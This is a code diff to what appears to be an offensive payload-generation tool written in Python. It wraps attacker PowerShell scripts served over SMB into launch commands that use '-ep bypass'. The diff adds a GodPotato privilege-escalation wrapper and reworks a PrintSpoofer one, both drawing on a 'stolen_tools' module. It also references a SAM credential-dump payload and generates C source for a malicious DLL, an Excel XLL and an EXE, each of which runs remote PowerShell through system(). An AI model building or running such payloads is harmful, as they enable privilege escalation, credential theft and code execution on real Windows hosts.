@@ -1,5 +1,11 @@
 import subprocess
 
+from stolen_tools.steal_tools import provide_godpotato, provide_printspoofer
+
+"""Payloads take a file and wrap it into another file!! 
+EXCEPTION: PowershellFileRunner DOES NOT CREATE A POWERSHELL FILE!!
+This is a huge fucking mess and looked better on the whiteboard than in reality!"""
+
 
 class Payload:
     ext = ""
@@ -22,14 +28,15 @@ class Payload:
             output_file.await_me()
         
 
-class PowershellRunner(Payload):
+class PowershellFileRunner(Payload):
+    """Run an EXISTING powershell file THIS DOES NOT CREATE A FILE!"""
     def __init__(self, smb_server_object, input_files):
         super().__init__(smb_server_object, False, input_files)
 
     def generate(self):
         if self.payload:
             return
-        self.payload = f"powershell.exe -ep bypass -file {self.input_files[0].remote_path_backslashes_double}"
+        self.payload = f"powershell.exe -ep bypass -file {self.input_files[0].remote_path}"
 
 
 class PrintSpoofer(Payload):
@@ -38,9 +45,18 @@ class PrintSpoofer(Payload):
     def generate(self):
         if self.payload:
             return
-        runner = PowershellRunner(self.smb_server_object, [self.input_files[1]])
-        print_spoofer = f'{self.input_files[0].remote_path} -c "{runner.payload}"'
+        print_spooofer_exe = self.smb_server_object.create_temp_file(provide_printspoofer(), ext=".exe")
+        runner = PowershellFileRunner(self.smb_server_object, [self.input_files[0]])
+        print_spoofer = f'{print_spooofer_exe.remote_path} -c "{runner.payload}"'
         self.payload = print_spoofer
+
+class GodPotato(Payload):
+    ext = ".ps1"
+    def generate(self):
+        god_potato_exe = self.smb_server_object.create_temp_file(provide_godpotato(), ext=".exe")
+        runner = PowershellFileRunner(self.smb_server_object, [self.input_files[0]])
+        potato = f'{god_potato_exe.remote_path} -cmd "{runner.payload}"'
+        self.payload = potato
 
 
 class SamDumpPowershell(Payload):
@@ -66,7 +82,7 @@ class CRunPowershell(Payload):
 
     def generate(self):
         self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
-        powershell = PowershellRunner(self.smb_server_object, self.input_files)
+        powershell = PowershellFileRunner(self.smb_server_object, self.input_files)
         self.payload = '#include <windows.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved){switch (ul_reason_for_call){case DLL_PROCESS_ATTACH:system("'
         self.payload += powershell.payload
         self.payload += '");break;default:break;}return TRUE;}'
@@ -83,7 +99,7 @@ class CRunPowershellXll(Payload):
 
     def generate(self):
         self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
-        powershell = PowershellRunner(self.smb_server_object, self.input_files)
+        powershell = PowershellFileRunner(self.smb_server_object, self.input_files)
         self.payload = '#include <windows.h>\n\nvoid xlAutoOpen() {system("'
         self.payload += powershell.payload
         self.payload += '");}'
@@ -91,6 +107,7 @@ class CRunPowershellXll(Payload):
             process.communicate(input=self.payload.encode())
 
 class CRunPowershellExe(Payload):
+    """Run an EXISTING powershell file inside an exe"""
     ext = ".exe"
     compiler = "/usr/bin/x86_64-w64-mingw32-gcc"
 
@@ -99,7 +116,7 @@ class CRunPowershellExe(Payload):
 
     def generate(self):
         self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
-        powershell = PowershellRunner(self.smb_server_object, self.input_files)
+        powershell = PowershellFileRunner(self.smb_server_object, self.input_files)
         self.payload = '#include <stdlib.h>\n\nvoid main(int argc, char *argv[]){system("'
         self.payload += powershell.payload
         self.payload += '");}'
